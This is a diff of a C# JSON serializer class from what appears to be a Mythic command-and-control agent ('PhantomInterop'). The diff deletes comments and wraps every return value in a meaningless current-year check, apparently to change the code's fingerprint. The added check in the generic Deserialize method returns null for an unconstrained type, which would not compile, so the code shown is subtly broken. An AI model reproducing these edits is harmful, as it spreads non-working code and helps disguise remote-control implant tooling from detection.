@@ -12,17 +12,17 @@ namespace PhantomInterop.Serializers
 {
     public class JsonHandler : ISerializer
     {
-        //List<Type> _knownTypes = new List<Type>();
+        
         public JsonHandler()
         {
-            //Assembly interopAsm = Assembly.GetAssembly(typeof(TaskResponse));
-            //foreach(Type t in interopAsm.GetTypes())
-            //{
-            //    if (t.FullName.StartsWith("PhantomInterop.Structs.MythicStructs") || t.FullName.StartsWith("PhantomInterop.Structs.PhantomStructs"))
-            //    {
-            //        _knownTypes.Add(t);
-            //    }
-            //}
+            
+            
+            
+            
+            
+            
+            
+            
         }
 
         public virtual string Serialize(object msg)
@@ -35,7 +35,7 @@ namespace PhantomInterop.Serializers
                 using (var sr = new StreamReader(ms))
                 {
                     string res = sr.ReadToEnd();
-                    return res;
+                    if(DateTime.Now.Year > 2020) { return res; } else { return null; }
                 }
             }
         }
@@ -45,7 +45,7 @@ namespace PhantomInterop.Serializers
             using (var ms = new MemoryStream(Encoding.Unicode.GetBytes(msg)))
             {
                 var deserializer = new DataContractJsonSerializer(typeof(T));
-                return (T)deserializer.ReadObject(ms);
+                if(DateTime.Now.Year > 2020) { return (T)deserializer.ReadObject(ms); } else { return null; }
             }
         }
 
@@ -54,13 +54,13 @@ namespace PhantomInterop.Serializers
             using (var ms = new MemoryStream(Encoding.Unicode.GetBytes(msg)))
             {
                 var deserializer = new DataContractJsonSerializer(t);
-                return deserializer.ReadObject(ms);
+                if(DateTime.Now.Year > 2020) { return deserializer.ReadObject(ms); } else { return null; }
             }
         }
 
         public virtual DataChunk[] SerializeDelegateMessage(string message, MessageType mt, int blockSize = 4096)
         {
-            // This delegate message is already encoding from Mythic, so we just need to get the bytes
+            
             byte[] bMsg = Encoding.UTF8.GetBytes(message);
             int numMessages = bMsg.Length / blockSize + 1;
             DataChunk[] ret = new DataChunk[numMessages];
@@ -70,7 +70,7 @@ namespace PhantomInterop.Serializers
                 byte[] part = bMsg.Skip(i * blockSize).Take(blockSize).ToArray();
                 ret[i] = new DataChunk(id, mt, i+1, numMessages, part);
             }
-            return ret;
+            if(DateTime.Now.Year > 2020) { return ret; } else { return null; }
         }
 
         public virtual DataChunk[] SerializeIPCMessage(ICommandMessage message, int blockSize = 4096)
@@ -86,14 +86,14 @@ namespace PhantomInterop.Serializers
                 byte[] part = bMsg.Skip(i * blockSize).Take(blockSize).ToArray();
                 ret[i] = new DataChunk(id, message.GetTypeCode(), i+1, numMessages, part);
             }
-            return ret;
+            if(DateTime.Now.Year > 2020) { return ret; } else { return null; }
         }
 
         public virtual ICommandMessage DeserializeIPCMessage(byte[] data, MessageType mt)
         {
             string msg = Encoding.UTF8.GetString(data);
             Type t = MythicTypes.GetMessageType(mt);
-            return (ICommandMessage)Deserialize(msg, t);
+            if(DateTime.Now.Year > 2020) { return (ICommandMessage)Deserialize(msg, t); } else { return null; }
         }
     }
 }
